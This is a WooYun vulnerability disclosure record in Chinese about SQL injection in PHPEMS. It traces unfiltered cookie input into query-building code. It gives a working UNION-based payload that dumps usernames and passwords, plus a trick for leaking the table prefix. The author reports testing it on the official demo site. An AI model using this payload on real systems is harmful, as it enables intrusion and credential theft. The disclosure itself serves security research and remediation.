{"id": 43723, "wybug_id": "wooyun-2014-081915", "wybug_title": "PHPEMS注入一处(Demo测试成功)", "wybug_corp": "PHPEMS", "wybug_author": "SLAckEr", "wybug_date": "2014-11-06 15:02", "wybug_open_date": "2015-02-04 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 过滤不严导致的注入 详细说明：  看文件 /app/exam/app.php  272-286行\npublic function lesson()\t{\t\t$action = $this->ev->url(3);\t\t$page = $this->ev->get('page');\t\tswitch($action)\t\t{\t\t\tcase 'ajax':\t\t\tswitch($this->ev->url(4))\t\t\t{\t\t\t\tcase 'questions':\t\t\t\t$number = $this->ev->get('number');\t\t\t\tif(!$number)$number = 1;\t\t\t\t$questid = $this->ev->getCookie('questype');\t\t\t\t$knowsid = $this->ev->getCookie('knowsid');\t\t\t\t$questions = $this->question->getRandQuestionListByKnowid($knowsid,$questid);\n跟下getCookie 文件/lib/ev.cls.php 81-85行\npublic function getCookie($par,$nohead = 0)    {    \tif(isset($this->cookie[CH.$par]))return $this->cookie[CH.$par];    \telseif(isset($this->cookie[$par]) && $nohead)return $this->cookie[$par];    \telse return false;    }\n从cookie中获得参数，这里的knowsid没有处理。然后带进了这个函数getRandQuestionListByKnowid跟一下/app/exam/cls/question.cls.php  94-105行\npublic function getRandQuestionListByKnowid($knowid,$typeid)\t{\t\t$data = array('DISTINCT questions.questionid',array('questions','quest2knows'),array(\"quest2knows.qkknowsid IN ({$knowid})\",\"quest2knows.qktype = 0\",\"quest2knows.qkquestionid = questions.questionid\",\"questions.questiontype = '{$typeid}'\",\"questions.questionstatus = 1\"),false,false,false);\t\t$sql = $this->sql->makeSelect($data);\t\t$r = $this->db->fetchAll($sql);\t\t$t = array();\t\tforeach($r as $p)\t\t{\t\t\t$t[] = $p['questionid'];\t\t}\t\treturn $t;\t}\n注意$data,$knowid没有单引号也没有处理。再看下makeSelect  /lib/sql.cls.php  214-282\npublic function makeSelect($selectors,$type = 1)\t{\t\tif(!is_array($selectors))return false;\t\t$sql = \"SELECT \";\t\tif(!$selectors[0])$selectors[0] = \"*\";\t\tif(is_array($selectors[0]))\t\t{\t\t\t$sql .= rtrim(implode(',',$selectors[0]),',');\t\t}\t\telse $sql .= $selectors[0];\t\t$sql .= \" FROM \";\t\tif(is_array($selectors[1]))\t\t{\t\t\t$tmp = NULL;\t\t\tforeach($selectors[1] as $p)\t\t\t{\t\t\t\tif($type)$tmp .= $this->tablepre.$p.\" AS \".$p.\",\";\t\t\t\telse\t\t\t\t$tmp .= $p.\" AS t ,\";\t\t\t}\t\t\t$sql .= rtrim($tmp,',');\t\t}\t\telse\t\t{\t\t\tif($type)$sql .= $this->tablepre.$selectors[1].\" AS \".$selectors[1];\t\t\telse\t\t\t$sql .= $selectors[1].\" AS t\";\t\t}\t\t$sql .= \" WHERE \";\t\tif(!$selectors[2])$selectors[2] = 1;\t\tif(is_array($selectors[2]))\t\t{\t\t\t$sql .= rtrim(implode(' AND ',$selectors[2]),'AND ');\t\t}\t\telse $sql .= $selectors[2];\t\tif($selectors[3])\t\t{\t\t\t$sql .= \" GROUP BY \";\t\t\tif(is_array($selectors[3]))\t\t\t{\t\t\t\t$sql .= rtrim(implode(',',$selectors[3]),',');\t\t\t}\t\t\telse $sql .= $selectors[3];\t\t}\t\tif($selectors[4])\t\t{\t\t\t$sql .= \" ORDER BY \";\t\t\tif(is_array($selectors[4]))\t\t\t{\t\t\t\t$sql .= rtrim(implode(',',$selectors[4]),',');\t\t\t}\t\t\telse $sql .= $selectors[4];\t\t}\t\tif($selectors[5])\t\t{\t\t\t$sql .= \" LIMIT \";\t\t\tif(is_array($selectors[5]))\t\t\t{\t\t\t\t$sql .= rtrim(implode(',',$selectors[5]),',');\t\t\t}\t\t\telse $sql .= $selectors[5];\t\t}\t\telseif($selectors[5] !== false)\t\t{\t\t\t$sql .= \" LIMIT 0,100\";\t\t}\t\treturn $sql;\t}\n直接生成select语句的sql，没有处理。这样就导致了注入的产生。   漏洞证明：  利用过程：首先注册个用户，开一个新考场\n\n是免费的测试的。然后访问http://127.0.0.1/phpems_zxmnks_v2.2/index.php?exam-app-lesson-ajax-questions&number=1抓包\n\n\n\n输入pocNULL) union select concat(username,0x23,userpassword) from x2_user #(\n\n那么如果数据库前缀改掉了肿么办？http://127.0.0.1/phpems_zxmnks_v2.2/index.php?exam-app-lesson-ajax-questions&number=直接访问这个就行了，把number参数的值去掉，就可以爆出前缀，。。。。\n\n官网的前缀不是x2，改掉了。通过这个方法爆出，然后上个图。\n\nmask 区域\n*****^^**********38e8bc2e36df388e57c2b0.jpg*****\n\n还有问题的函数getRandQuestionRowsListByKnowidgetKnowsBySubjectAndAreaidgetRandQuestionList没在仔细看了，睡觉了。。   修复方案：  对cookie传递进来的参数过滤，对带入sql查询的变量从函数上过滤。   版权声明：转载请注明来源 SLAckEr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}